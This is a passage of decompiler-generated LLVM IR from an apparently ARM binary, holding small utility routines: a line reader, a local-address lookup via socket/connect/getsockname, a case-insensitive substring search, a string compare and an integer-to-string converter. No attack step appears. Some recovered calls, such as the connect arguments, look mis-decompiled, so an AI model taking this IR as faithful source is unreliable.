  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11a34.dec_label_pc_11a08_crit_edge, %dec_label_pc_119f0
  %v0_11a0c = phi i32 [ %v0_11a0c.pre, %dec_label_pc_11a34.dec_label_pc_11a08_crit_edge ], [ %arg3, %dec_label_pc_119f0 ]
  %v0_11a08 = phi i32 [ %v1_11a20, %dec_label_pc_11a34.dec_label_pc_11a08_crit_edge ], [ %tmp, %dec_label_pc_119f0 ]
  %v3_11a14 = inttoptr i32 %v0_11a08 to i32*
  %v4_11a14 = call i32 @read(i32 %v0_11a0c, i32* %v3_11a14, i32 1)
  %v7_11a18 = icmp eq i32 %v4_11a14, 1
  %v0_11a1c = load i32, i32* %r4.global-to-local, align 4
  %v1_11a20 = add i32 %v0_11a1c, 1
  store i32 %v1_11a20, i32* %r4.global-to-local, align 4
  %v0_11a28 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_11a18, label %dec_label_pc_11a28, label %dec_label_pc_11a40

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11a08
  %v1_11a28 = add i32 %v0_11a28, 1
  store i32 %v1_11a28, i32* %r5.global-to-local, align 4
  %v0_11a2c = load i32, i32* %r7.global-to-local, align 4
  %v7_11a30 = icmp sgt i32 %v0_11a2c, %v1_11a28
  br i1 %v7_11a30, label %dec_label_pc_11a34, label %dec_label_pc_11a40

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a28
  %v1_11a34 = inttoptr i32 %v0_11a1c to i8*
  %v2_11a34 = load i8, i8* %v1_11a34, align 1
  %v7_11a38 = icmp eq i8 %v2_11a34, 10
  br i1 %v7_11a38, label %dec_label_pc_11a40, label %dec_label_pc_11a34.dec_label_pc_11a08_crit_edge

dec_label_pc_11a34.dec_label_pc_11a08_crit_edge:  ; preds = %dec_label_pc_11a34
  %v0_11a0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a08

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a08, %dec_label_pc_11a34, %dec_label_pc_11a28
  %v0_11a40 = phi i32 [ %v1_11a28, %dec_label_pc_11a34 ], [ %v1_11a28, %dec_label_pc_11a28 ], [ %v0_11a28, %dec_label_pc_11a08 ]
  %v2_11a40 = icmp eq i32 %v0_11a40, 0
  %v1_11a44 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_11a40, i32 0, i32 %v1_11a44
  %v2_11a4c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11a4c, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11a20, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 1, 0, 2 }
  uselistorder i32 (i32, i32*, i32)* @read, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_11a40, { 1, 2, 0 }
}

define i32 @function_11a50() local_unnamed_addr {
dec_label_pc_11a50:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_11a60 = call i32* @__errno_location()
  store i32 0, i32* %v0_11a60, align 4
  %v3_11a78 = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_11a84 = icmp eq i32 %v3_11a78, -1
  store i32 %v3_11a78, i32* %r5.global-to-local, align 4
  %v2_11a90 = load i32, i32* %r4.global-to-local, align 4
  br i1 %v7_11a84, label %dec_label_pc_11ae0, label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a50
  %v7_11a90 = shl i32 2056, %v2_11a90
  %v8_11a90 = or i32 %v7_11a90, 2056
  %v2_11a58 = ptrtoint i32* %stack_var_-40 to i32
  %v1_11a94 = inttoptr i32 %v2_11a90 to %sockaddr*
  store i32 2, i32* %stack_var_-40, align 4
  %v6_11ac0 = call i32 @connect(i32 %v2_11a58, %sockaddr* %v1_11a94, i32 %v2_11a90)
  %tmp13 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v0_11acc = load i32, i32* %r5.global-to-local, align 4
  %v6_11ad0 = call i32 @getsockname(i32 %v0_11acc, %sockaddr* %tmp13, i32* nonnull %stack_var_-24)
  %v1_11ad8 = call i32 @close(i32 %v0_11acc)
  br label %dec_label_pc_11ae0

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11a50, %dec_label_pc_11aa4
  %v0_11ae0 = phi i32 [ 0, %dec_label_pc_11a50 ], [ %v8_11a90, %dec_label_pc_11aa4 ]
  ret i32 %v0_11ae0

; uselistorder directives
  uselistorder i32 %v2_11a90, { 1, 0, 2 }
  uselistorder i32 %v3_11a78, { 1, 0 }
  uselistorder i32 (i32)* @close, { 18, 20, 17, 24, 22, 21, 23, 31, 19, 30, 29, 33, 32, 28, 27, 26, 25, 4, 3, 2, 1, 0, 9, 8, 7, 6, 5, 14, 15, 10, 13, 12, 11, 16, 34 }
  uselistorder i32 (i32, %sockaddr*, i32)* @connect, { 3, 8, 2, 4, 7, 6, 1, 0, 5, 9 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 21, 22, 25, 26, 4, 6, 5, 8, 7, 16, 15, 24, 23, 12, 11, 0, 20, 19, 1, 3, 14, 2, 18, 17, 13, 10, 9, 27 }
  uselistorder i32* ()* @__errno_location, { 1, 2, 4, 0, 3, 5 }
  uselistorder label %dec_label_pc_11ae0, { 1, 0 }
}

define i32 @function_11aec(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11aec:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_11af0 = load i8, i8* %tmp, align 1
  %v2_11af4 = icmp eq i8 %v3_11af0, 0
  br i1 %v2_11af4, label %bb, label %dec_label_pc_11b08

bb:                                               ; preds = %dec_label_pc_11aec
  %v4_11af0 = zext i8 %v3_11af0 to i32
  br label %dec_label_pc_11b1c

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11aec
  br label %dec_label_pc_11b0c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11b0c, %dec_label_pc_11b08
  %v0_11b0c = phi i32 [ %v1_11b0c, %dec_label_pc_11b0c ], [ 0, %dec_label_pc_11b08 ]
  %v1_11b0c = add i32 %v0_11b0c, 1
  %v2_11b10 = add i32 %v1_11b0c, %arg2
  %v3_11b10 = inttoptr i32 %v2_11b10 to i8*
  %v4_11b10 = load i8, i8* %v3_11b10, align 1
  %v2_11b14 = icmp eq i8 %v4_11b10, 0
  br i1 %v2_11b14, label %dec_label_pc_11b1c, label %dec_label_pc_11b0c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b0c, %bb
  %v0_11b6018 = phi i32 [ %v4_11af0, %bb ], [ %v1_11b0c, %dec_label_pc_11b0c ]
  %v0_11b241 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_11b241, 1
  br i1 %tmp27, label %dec_label_pc_11b70, label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b1c, %dec_label_pc_11b24.backedge
  %v0_11b28.in = phi i32 [ %v0_11b28, %dec_label_pc_11b24.backedge ], [ %v0_11b241, %dec_label_pc_11b1c ]
  %v0_11b54 = phi i32 [ %v1_11b54., %dec_label_pc_11b24.backedge ], [ 0, %dec_label_pc_11b1c ]
  %v0_11b30 = phi i32 [ %v5_11b30, %dec_label_pc_11b24.backedge ], [ %tmp20, %dec_label_pc_11b1c ]
  %v0_11b28 = add i32 %v0_11b28.in, -1
  %v1_11b30 = inttoptr i32 %v0_11b30 to i8*
  %v2_11b30 = load i8, i8* %v1_11b30, align 1
  %v3_11b30 = zext i8 %v2_11b30 to i32
  %v5_11b30 = add i32 %v0_11b30, 1
  %v2_11b34 = add i32 %v0_11b54, %arg2
  %v3_11b34 = inttoptr i32 %v2_11b34 to i8*
  %v4_11b34 = load i8, i8* %v3_11b34, align 1
  %v6_11b34 = zext i8 %v4_11b34 to i32
  %v1_11b38 = add nsw i32 %v3_11b30, -65
  %v1_11b3c = add nsw i32 %v6_11b34, -65
  %tmp35 = icmp ult i32 %v1_11b38, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_11b30
  %v5_11b44 = or i32 %v3_11b30, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_11b30, %bb28
  %v0_11b50 = phi i32 [ %v3_11b30, %dec_label_pc_11b30 ], [ %v5_11b44, %bb28 ]
  %tmp36 = icmp ult i32 %v1_11b3c, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_11b4c = or i32 %v6_11b34, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_11b50 = phi i32 [ %v6_11b34, %bb29 ], [ %v5_11b4c, %bb30 ]
  %v9_11b50 = icmp eq i32 %v0_11b50, %v1_11b50
  %v1_11b54 = add i32 %v0_11b54, 1
  %v1_11b54. = select i1 %v9_11b50, i32 %v1_11b54, i32 0
  br i1 %v9_11b50, label %dec_label_pc_11b60, label %dec_label_pc_11b24.backedge

dec_label_pc_11b24.backedge:                      ; preds = %bb31, %dec_label_pc_11b60
  %tmp32 = icmp slt i32 %v0_11b28, 1
  br i1 %tmp32, label %dec_label_pc_11b70, label %dec_label_pc_11b30

dec_label_pc_11b60:                               ; preds = %bb31
  %v9_11b60 = icmp eq i32 %v0_11b6018, %v1_11b54.
  br i1 %v9_11b60, label %dec_label_pc_11b68, label %dec_label_pc_11b24.backedge

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b60
  %v2_11b68 = sub i32 %v5_11b30, %tmp20
  ret i32 %v2_11b68

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b24.backedge, %dec_label_pc_11b1c
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_11b54., { 1, 0 }
  uselistorder i32 %v0_11b30, { 1, 0 }
  uselistorder i32 %v0_11b54, { 1, 0 }
  uselistorder i8 %v3_11af0, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 3, 8, 2, 7, 4, 9, 5, 10, 6, 11, 12 }
  uselistorder i32* @r1, { 3, 13, 0, 14, 31, 32, 5, 4, 45, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 1, 18, 40, 41, 2, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 42, 43, 44, 46 }
  uselistorder label %dec_label_pc_11b24.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_11b30, { 1, 0 }
}

define i32 @function_11b78(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11b78:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11b78 = load i8, i8* %arg1, align 1
  %v2_11b7c = icmp eq i8 %v2_11b78, 0
  br i1 %v2_11b7c, label %bb, label %dec_label_pc_11b88

bb:                                               ; preds = %dec_label_pc_11b78
  %v3_11b78 = zext i8 %v2_11b78 to i32
  br label %dec_label_pc_11b9c

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b78
  br label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11b8c, %dec_label_pc_11b88
  %v0_11b8c = phi i32 [ %v1_11b8c, %dec_label_pc_11b8c ], [ 0, %dec_label_pc_11b88 ]
  %v1_11b8c = add i32 %v0_11b8c, 1
  %v2_11b90 = add i32 %v1_11b8c, %tmp
  %v3_11b90 = inttoptr i32 %v2_11b90 to i8*
  %v4_11b90 = load i8, i8* %v3_11b90, align 1
  %v2_11b94 = icmp eq i8 %v4_11b90, 0
  br i1 %v2_11b94, label %dec_label_pc_11b9c, label %dec_label_pc_11b8c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b8c, %bb
  %v0_11bc0 = phi i32 [ %v3_11b78, %bb ], [ %v1_11b8c, %dec_label_pc_11b8c ]
  %v1_11b9c = inttoptr i32 %arg2 to i8*
  %v2_11b9c = load i8, i8* %v1_11b9c, align 1
  %v2_11ba0 = icmp eq i8 %v2_11b9c, 0
  br i1 %v2_11ba0, label %bb22, label %dec_label_pc_11bac

bb22:                                             ; preds = %dec_label_pc_11b9c
  %v3_11b9c = zext i8 %v2_11b9c to i32
  br label %dec_label_pc_11bc0

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b9c
  br label %dec_label_pc_11bb0

dec_label_pc_11bb0:                               ; preds = %dec_label_pc_11bb0, %dec_label_pc_11bac
  %v0_11bb0 = phi i32 [ %v1_11bb0, %dec_label_pc_11bb0 ], [ 0, %dec_label_pc_11bac ]
  %v1_11bb0 = add i32 %v0_11bb0, 1
  %v2_11bb4 = add i32 %v1_11bb0, %arg2
  %v3_11bb4 = inttoptr i32 %v2_11bb4 to i8*
  %v4_11bb4 = load i8, i8* %v3_11bb4, align 1
  %v2_11bb8 = icmp eq i8 %v4_11bb4, 0
  br i1 %v2_11bb8, label %dec_label_pc_11bc0, label %dec_label_pc_11bb0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb0, %bb22
  %v0_11bec4 = phi i32 [ %v3_11b9c, %bb22 ], [ %v1_11bb0, %dec_label_pc_11bb0 ]
  %v9_11bc0 = icmp eq i32 %v0_11bc0, %v0_11bec4
  br i1 %v9_11bc0, label %dec_label_pc_11bec.preheader, label %dec_label_pc_11bcc

dec_label_pc_11bec.preheader:                     ; preds = %dec_label_pc_11bc0
  %v2_11bec6 = icmp eq i32 %v0_11bc0, 0
  br i1 %v2_11bec6, label %dec_label_pc_11bf4, label %dec_label_pc_11bd4

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bd4, %dec_label_pc_11bc0
  ret i32 0

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11be4, %dec_label_pc_11bec.preheader
  %v0_11bec.in = phi i32 [ %v0_11bec, %dec_label_pc_11be4 ], [ %v0_11bc0, %dec_label_pc_11bec.preheader ]
  %v0_11be8 = phi i32 [ %v1_11be8, %dec_label_pc_11be4 ], [ %arg2, %dec_label_pc_11bec.preheader ]
  %v0_11be4 = phi i32 [ %v1_11be4, %dec_label_pc_11be4 ], [ %tmp, %dec_label_pc_11bec.preheader ]
  %v0_11bec = add i32 %v0_11bec.in, -1
  %v1_11bd4 = inttoptr i32 %v0_11be4 to i8*
  %v2_11bd4 = load i8, i8* %v1_11bd4, align 1
  %v1_11bd8 = inttoptr i32 %v0_11be8 to i8*
  %v2_11bd8 = load i8, i8* %v1_11bd8, align 1
  %v9_11bdc = icmp eq i8 %v2_11bd4, %v2_11bd8
  br i1 %v9_11bdc, label %dec_label_pc_11be4, label %dec_label_pc_11bcc

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bd4
  %v1_11be4 = add i32 %v0_11be4, 1
  %v1_11be8 = add i32 %v0_11be8, 1
  %v2_11bec = icmp eq i32 %v0_11bec, 0
  br i1 %v2_11bec, label %dec_label_pc_11bf4, label %dec_label_pc_11bd4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be4, %dec_label_pc_11bec.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_11b9c, { 1, 0 }
  uselistorder i8 %v2_11b78, { 1, 0 }
}

define i32 @function_11bfc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11bfc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11bfc = load i32, i32* @r4, align 4
  store i32 %v3_11bfc, i32* %stack_var_-28, align 4
  %v22_11bfc = ptrtoint i32* %stack_var_-28 to i32
  %v0_11c00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11c00, i32* %r8.global-to-local, align 4
  %v2_11c00 = icmp eq i32 %v0_11c00, 0
  store i1 %v2_11c00, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_11c00, label %dec_label_pc_11cf0, label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %dec_label_pc_11bfc
  %v3_11c10 = icmp eq i8 %arg1, 0
  store i1 %v3_11c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11c10, label %.thread, label %dec_label_pc_11c24

.thread:                                          ; preds = %dec_label_pc_11c10
  %v4_11c18 = inttoptr i32 %v0_11c00 to i8*
  store i8 48, i8* %v4_11c18, align 1
  %v0_11c1c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11c1c.pr.pr, label %.thread1, label %dec_label_pc_11c24

.thread1:                                         ; preds = %.thread
  %v4_11c1c = load i32, i32* %r8.global-to-local, align 4
  %v5_11c1c = add i32 %v4_11c1c, 1
  %v6_11c1c = inttoptr i32 %v5_11c1c to i8*
  store i8 0, i8* %v6_11c1c, align 1
  %v0_11c20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11c20.pr.pr, label %dec_label_pc_11cf0, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c10, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_11c28 = icmp eq i32 %arg2, 10
  store i1 %v7_11c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c28, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_11c24
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11c24
  %v4_11c24 = zext i1 %tmp40 to i32
  store i32 %v4_11c24, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_11c4c

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_11c5c

dec_label_pc_11c4c:                               ; preds = %bb
  %v2_11c4c = sub nsw i32 0, %tmp
  store i1 %v3_11c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11c10, label %dec_label_pc_11cfc, label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c4c, %.thread4
  %v0_11c6410 = phi i32 [ %tmp, %.thread4 ], [ %v2_11c4c, %dec_label_pc_11c4c ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_11c4c ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_11c60 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_11c60, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c64

dec_label_pc_11c64:                               ; preds = %bb38, %dec_label_pc_11c5c
  %v2_11c84 = phi i32 [ %v5_11c84, %bb38 ], [ %v2_11c60, %dec_label_pc_11c5c ]
  %v0_11c80 = phi i32 [ %v2_11c88, %bb38 ], [ %v0_11c6410, %dec_label_pc_11c5c ]
  %v0_11c68 = load i32, i32* %r5.global-to-local, align 4
  %v2_11c6c = urem i32 %v0_11c80, %v0_11c68
  store i32 %v2_11c6c, i32* %r0.global-to-local, align 4
  %v7_11c70 = icmp eq i32 %v2_11c6c, 9
  store i1 %v7_11c70, i1* %cpsr_z.global-to-local, align 1
  %v1_11c74 = add i32 %v2_11c6c, 48
  store i32 %v0_11c68, i32* %r1.global-to-local, align 4
  %v7_11c7c = icmp sgt i32 %v2_11c6c, 9
  %extract.t = trunc i32 %v1_11c74 to i8
  br i1 %v7_11c7c, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_11c64
  %v9_11c7c = add i32 %v2_11c6c, 55
  %extract.t21 = trunc i32 %v9_11c7c to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_11c64, %bb37
  %v0_11c84.off0 = phi i8 [ %extract.t, %dec_label_pc_11c64 ], [ %extract.t21, %bb37 ]
  store i32 %v0_11c80, i32* %r0.global-to-local, align 4
  %v3_11c84 = inttoptr i32 %v2_11c84 to i8*
  store i8 %v0_11c84.off0, i8* %v3_11c84, align 1
  %v4_11c84 = load i32, i32* %r7.global-to-local, align 4
  %v5_11c84 = add i32 %v4_11c84, -1
  store i32 %v5_11c84, i32* %r7.global-to-local, align 4
  %v0_11c88 = load i32, i32* %r0.global-to-local, align 4
  %v1_11c88 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c88 = udiv i32 %v0_11c88, %v1_11c88
  store i32 %v2_11c88, i32* %r0.global-to-local, align 4
  %v2_11c8c = icmp ugt i32 %v1_11c88, %v0_11c88
  store i1 %v2_11c8c, i1* %cpsr_z.global-to-local, align 1
  %v0_11c90 = load i32, i32* %r6.global-to-local, align 4
  %v1_11c90 = add i32 %v0_11c90, -1
  store i32 %v1_11c90, i32* %r6.global-to-local, align 4
  br i1 %v2_11c8c, label %dec_label_pc_11c98, label %dec_label_pc_11c64

dec_label_pc_11c98:                               ; preds = %bb38
  %v0_11c98 = load i32, i32* %sl.global-to-local, align 4
  %v2_11c98 = icmp eq i32 %v0_11c98, 0
  store i1 %v2_11c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c98, label %bb39, label %dec_label_pc_11d00

bb39:                                             ; preds = %dec_label_pc_11c98
  store i32 %v0_11c90, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ca4

dec_label_pc_11ca4:                               ; preds = %bb39, %dec_label_pc_11d00
  %v1_11cb0 = phi i32 [ %v0_11c90, %bb39 ], [ %v1_11ca8.pre, %dec_label_pc_11d00 ]
  %v2_11ca4 = ptrtoint i32* %stack_var_-62 to i32
  %v2_11ca8 = add i32 %v1_11cb0, %v2_11ca4
  %v3_11ca8 = inttoptr i32 %v2_11ca8 to i8*
  %v4_11ca8 = load i8, i8* %v3_11ca8, align 1
  %v6_11ca8 = zext i8 %v4_11ca8 to i32
  store i32 %v6_11ca8, i32* %r2.global-to-local, align 4
  %v2_11cac = icmp eq i8 %v4_11ca8, 0
  store i1 %v2_11cac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11ca8, i32* %r1.global-to-local, align 4
  br i1 %v2_11cac, label %dec_label_pc_11cd4, label %dec_label_pc_11cb8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11ca4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cbc, %dec_label_pc_11cb8
  %v0_11cbc = phi i32 [ %v1_11cbc, %dec_label_pc_11cbc ], [ 0, %dec_label_pc_11cb8 ]
  %v1_11cbc = add i32 %v0_11cbc, 1
  store i32 %v1_11cbc, i32* %r2.global-to-local, align 4
  %v2_11cc0 = add i32 %v1_11cbc, %v2_11ca8
  %v3_11cc0 = inttoptr i32 %v2_11cc0 to i8*
  %v4_11cc0 = load i8, i8* %v3_11cc0, align 1
  %v2_11cc4 = icmp eq i8 %v4_11cc0, 0
  store i1 %v2_11cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11cc4, label %dec_label_pc_11ccc, label %dec_label_pc_11cbc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11cbc
  %v7_11ccc = icmp eq i32 %v0_11cbc, -2
  store i1 %v7_11ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ccc, label %dec_label_pc_11cf0, label %dec_label_pc_11cd4

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11ccc, %dec_label_pc_11ca4
  %v0_11cdc18 = phi i32 [ %v1_11cbc, %dec_label_pc_11ccc ], [ %v6_11ca8, %dec_label_pc_11ca4 ]
  store i32 %v2_11ca8, i32* %r0.global-to-local, align 4
  %v0_11cd8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11cd8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge, %dec_label_pc_11cd4
  %v2_11ce8 = phi i32 [ %v5_11ce8, %dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge ], [ %v0_11cd8, %dec_label_pc_11cd4 ]
  %v0_11ce0 = phi i32 [ %v0_11ce0.pre, %dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge ], [ %v2_11ca8, %dec_label_pc_11cd4 ]
  %v0_11cdc = phi i32 [ %v0_11cdc.pre, %dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge ], [ %v0_11cdc18, %dec_label_pc_11cd4 ]
  %v1_11cdc = add i32 %v0_11cdc, -1
  store i32 %v1_11cdc, i32* %r2.global-to-local, align 4
  %v1_11ce0 = inttoptr i32 %v0_11ce0 to i8*
  %v2_11ce0 = load i8, i8* %v1_11ce0, align 1
  %v5_11ce0 = add i32 %v0_11ce0, 1
  store i32 %v5_11ce0, i32* %r0.global-to-local, align 4
  %v3_11ce4 = icmp eq i32 %v0_11cdc, 0
  store i1 %v3_11ce4, i1* %cpsr_z.global-to-local, align 1
  %v3_11ce8 = inttoptr i32 %v2_11ce8 to i8*
  store i8 %v2_11ce0, i8* %v3_11ce8, align 1
  %v4_11ce8 = load i32, i32* %r1.global-to-local, align 4
  %v5_11ce8 = add i32 %v4_11ce8, 1
  store i32 %v5_11ce8, i32* %r1.global-to-local, align 4
  br i1 %v3_11ce4, label %dec_label_pc_11cf0, label %dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge

dec_label_pc_11cdc.dec_label_pc_11cdc_crit_edge:  ; preds = %dec_label_pc_11cdc
  %v0_11cdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_11ce0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cdc, %dec_label_pc_11ccc, %.thread1, %dec_label_pc_11bfc
  %v0_11cf0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11cf0, i32* %r0.global-to-local, align 4
  %v2_11cf8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11cf8, i32* @r4, align 4
  ret i32 %v0_11cf0

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11c4c
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11c98, %dec_label_pc_11cfc
  %v1_11d04 = phi i32 [ %v1_11c90, %dec_label_pc_11c98 ], [ 32, %dec_label_pc_11cfc ]
  %v2_11d04 = add i32 %v1_11d04, %v22_11bfc
  store i32 %v2_11d04, i32* %r2.global-to-local, align 4
  %v3_11d0c = add i32 %v2_11d04, -34
  %v4_11d0c = inttoptr i32 %v3_11d0c to i8*
  store i8 45, i8* %v4_11d0c, align 1
  %v1_11ca8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ca4

; uselistorder directives
  uselistorder i32 %v5_11ce8, { 1, 0 }
  uselistorder i1 %v3_11ce4, { 1, 0 }
  uselistorder i32 %v0_11ce0, { 1, 0 }
  uselistorder i1 %v7_11ccc, { 1, 0 }
  uselistorder i32 %v1_11cbc, { 0, 1, 3, 2 }
  uselistorder i32 %v2_11ca8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_11c88, { 1, 0 }
  uselistorder i32 %v5_11c84, { 1, 0 }
  uselistorder i32 %v2_11c6c, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_11c10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11c00, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 1, 0, 2 }
  uselistorder i32 9, { 4, 38, 28, 9, 24, 10, 25, 11, 26, 7, 27, 8, 23, 20, 6, 3, 29, 21, 2, 22, 30, 12, 31, 13, 32, 14, 33, 34, 15, 35, 16, 36, 17, 37, 0, 18, 1, 51, 39, 40, 41, 42, 43, 44, 5, 45, 46, 47, 48, 49, 50, 52, 53, 54, 19 }
